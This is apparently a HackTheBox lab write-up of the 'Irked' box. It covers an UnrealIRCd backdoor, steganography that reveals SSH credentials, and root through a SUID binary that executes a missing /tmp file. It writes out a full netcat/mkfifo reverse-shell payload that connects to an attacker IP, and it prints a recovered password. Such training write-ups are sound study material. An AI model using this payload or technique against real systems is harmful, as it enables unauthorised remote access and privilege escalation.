# Irked -- HackTheBox (write-up)

**Difficulty:** Easy
**Box:** Irked (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-05-22

---

## TL;DR

### Exploited UnrealIRCd backdoor for initial shell. Steganography on the website's image revealed SSH creds. Privesc via a SUID binary that executed a missing file.
---

## Target info

- Host: `10.129.216.69`
- Services discovered: `22/tcp (ssh)`, `80/tcp (http)`, `6697/tcp (irc)`

---

## Enumeration

Nmap results:

![Nmap results](images/irked-htb_1.png)

![Nmap results continued](images/irked-htb_2.png)

## Exploitation

From 0xdf's notes on the UnrealIRCd backdoor:

![UnrealIRCd backdoor](images/irked-htb_3.png)

Testing the backdoor:

![Testing backdoor](images/irked-htb_4.png)

- When I ran it, ping was already happening.

Connected to IRC and sent the reverse shell payload:

```bash
nc 10.129.216.69 6697
```

```
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.172 443 >/tmp/f
```

![Sending payload](images/irked-htb_5.png)

![Shell received](images/irked-htb_6.png)

## User

![Enumerating user](images/irked-htb_7.png)

Found a hint in a hidden file:

![Hidden file](images/irked-htb_8.png)

- `UPupDOWNdownLRlrBAbaSSss`
- "steg" -- back to picture on website

**steghide didn't work** so downloaded steghide manually:

![Steghide extract](images/irked-htb_9.png)

- Password found: `Kab6h+m+bbp2J:HG`

![SSH as djmardov](images/irked-htb_10.png)

## Privilege escalation

Found SUID binary `viewuser`:

![viewuser binary](images/irked-htb_11.png)

- It tries to execute `/tmp/listusers` which doesn't exist.

Created the file:

![Created file](images/irked-htb_12.png)

- **Permission denied** -- needed `chmod +x`.

```bash
chmod +x /tmp/listusers
```

![chmod](images/irked-htb_13.png)

![Execution](images/irked-htb_14.png)

Changed payload to `/bin/sh` and got root:

![Root shell](images/irked-htb_15.png)

---

## Lessons & takeaways

- Steganography hints in hidden files -- always check for `.hint` or similar
- SUID binaries that call missing files are easy wins for privesc
- When a binary references a non-existent path, create it with your payload
---
